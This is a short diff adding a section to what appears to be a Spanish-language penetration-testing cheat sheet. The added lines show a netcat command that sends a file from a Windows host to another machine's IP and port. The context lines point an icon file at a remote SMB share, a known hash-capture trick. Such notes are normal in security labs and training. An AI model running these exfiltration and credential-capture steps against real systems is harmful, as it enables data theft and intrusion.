@@ -2139,6 +2139,15 @@ Command=2
 IconFile=\\10.10.14.21\smbfolder\icon
 ```
 
+## Enviar archivos nc64.exe
+
+Para enviar archivos desde windows cuando no te deja usar SMB
+
+```
+nc.exe 192.168.1.5 1234 < archivo_a_enviar.txt
+```
+
+Ya sabes del otro lado solo lo revibes...
 
 ## Recon basico windows
 
